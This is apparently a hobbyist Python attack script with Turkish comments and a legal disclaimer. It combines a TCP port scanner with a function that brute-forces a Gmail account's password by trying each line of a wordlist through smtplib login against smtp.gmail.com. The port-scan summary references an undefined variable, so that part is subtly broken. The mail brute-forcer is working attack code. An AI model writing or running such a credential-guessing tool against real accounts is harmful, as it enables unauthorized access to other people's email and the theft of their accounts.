#                                         version: python3.8
#                                          LEGAL DISCLAIMER
#                                           (YASAL UYARI)
#       Usage of this program for attacking targets without prior mutual consent is illegal.
#       (Bu programin onceden karsilikli riza olmadan hedeflere saldirmak icin kullanilmasi yasa disidir.)
#       Developer assume no liability and are not responsible for any misuse or damage caused by this program.
#       (Gelistirici herhangi bir sorumluluk kabul etmez ve bu programin neden oldugu herhangi bir yanlis kullanim veya hasardan sorumlu degildir.)

import socket
import sys
import smtplib
from os import system
import time
import os

def help(): #Programin kullanim seklini kullaniciya bildirmek icin yazilmis bir fonksiyon.
    print("Usage: program.py [options]\n")
    print("Options:\n")
    print("-H, -P        Host ip address and check to port (e.g. program.py -H 192.168.1.1 -P 80 or program.py -H 192.168.1.1)")
    print("-M, -P        Target mail address and password file path (e.g. program.py -M target@gmail.com -P root\Desktop\pass.txt)\n")
    
def banner(): #Program baslangic bildirisi
    print ("\n\t\t\tLEGAL DISCLAIMER\n")
    print("Usage of this program for attacking targets without prior mutual consent is illegal.\n") 
    print("Developer assume no liability and are not responsible for any misuse or damage caused by this program.")
     
def basicPortAttack(): #Tek parametre ile port taramasi yapan fonksiyon
    banner()
    t1 = time.strftime('%X')
    remoteServer = sys.argv[2]
    print("\n" +10 * " " + "Started at:",t1)
    print("\n[{}][INFO]: Please wait, Scanning remote host".format(t1),remoteServer)
    try:
        for port in range(1,1024):
            remoteServerIP  = socket.gethostbyname(remoteServer)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                t2 = time.strftime("%X")
                print("[{}][INFO]: Open Port: ".format(t2),port)
            sock.close()
    except KeyboardInterrupt:
        t3 = time.strftime("%X")
        print ("[{}][CRITICAL]: 'User Quit' ".format(t3))
        print ("\n"+10*" " +"Shutting at:",t3)
        sys.exit()
    except socket.gaierror:
        t4 = time.strftime("%X")
        print ("\n[{}][CRITICAL]: Hostname could not be resolved. Exiting".format(t4))
        print ("\n"+10*" " +"Shutting at:",t4)
        sys.exit()
    except socket.error:
        t5 = time.strftime('%X')
        print ("[{}][ERROR]: Check your Internet Connection".format(t5))
        sys.exit()
    t6 = time.strftime("%X")
    print ("[{}][INFO]: {} port is closed".format(t6,closeportcount+1))
    print ("\n"+10*" " +"Shutting at:", t6)
    sys.exit()

def advancedPortAttack():#Birden fazla parametre ile port taramasi yapan fonksiyon
    banner()
    t1 = time.strftime('%X')
    remoteServer = sys.argv[2]
    try:
        port = int(sys.argv[4])
    except ValueError:
        t2 = time.strftime('%X')
        print("\n[{}][CRITICAL]: Please enter valid port number.".format(t2))
        sys.exit()
    print ("\n" +10 * " " + "Started at:",t1)
    print ("\n[{}][INFO]: Check port {} on the {}".format(t1,port,remoteServer))    
    try:
        remoteServerIP  = socket.gethostbyname(remoteServer)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((remoteServerIP, port))
        if result == 0:
            t3 = time.strftime("%X")
            print ("[{}][INFO]: Port: {} Status: OPEN".format(t3,port))
        elif result == 10061:
            t4 = time.strftime("%X")
            print("[{}][INFO]: Port: {} Status: CLOSE".format(t4,port))
        sock.close()
    except KeyboardInterrupt:
        t5 = time.strftime("%X")
        print ("[{}][CRITICAL]: 'User Quit' ".format(t5))
        print ("\n"+10*" " +"Shutting at:",t5)
        sys.exit()
    except socket.gaierror:
        t6 = time.strftime("%X")
        print ("\n[{}][CRITICAL]: Hostname could not be resolved. Exiting".format(t6))
        print ("\n"+10*" " +"Shutting at:",t6)
        sys.exit()
    except socket.error: 
        t7 = time.strftime('%X')
        print ("[{}][ERROR]: Check your Internet Connection".format(t7))
        sys.exit()
    sock.close()
    t8 = time.strftime("%X")
    print ("\n"+10*" " +"Shutting at:", t8)
    sys.exit()

def mailAttack():#Mail saldirisi yapan fonksiyon
    banner()
    t1 = time.strftime('%X')
    print ("\n" +5 * " " + "Started at:",t1+"\n")
    user = sys.argv[2]
    passwfile= sys.argv[4]
    smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
    smtpserver.ehlo()
    smtpserver.starttls()
    try:
        t2 = time.strftime('%X')
        passwfile = open(passwfile, "r")
    except:
        print("[{}][ERROR]: File not found!".format(t2))
        sys.exit()

    for password in passwfile:
        try:
            smtpserver.login(user, password)
            t3 = time.strftime('%X')
            print ("[{}][INFO]: Login Succesfuly, password : {}".format(t3,password))
            break
        except smtplib.SMTPAuthenticationError:
            t4 = time.strftime('%X')
            print ("[{}][ATTEMPT]: target: {}  trying: {} ".format(t4,user,password))
    t5 = time.strftime('%X')
    print ("\n"+5*" "+"Shutting at: "+t5)

def main():#Program baslangici ana fonksiyon
    if ((len(sys.argv) == 3) and (sys.argv[1] == "-H")):
        basicPortAttack()
        sys.exit()
    if ((len(sys.argv) == 5) and (sys.argv[1] == "-M") and (sys.argv[3] == "-P")):
        mailAttack()
        sys.exit()
    if ((len(sys.argv) == 5) and sys.argv[1] == "-H") and (sys.argv[3] == "-P"):
        advancedPortAttack()
        sys.exit()
    else:
        banner()
        print ("\nerror: please make sure you entered the parameters correctly!\n")
        help()
        os.system("pause")

main()#Basla
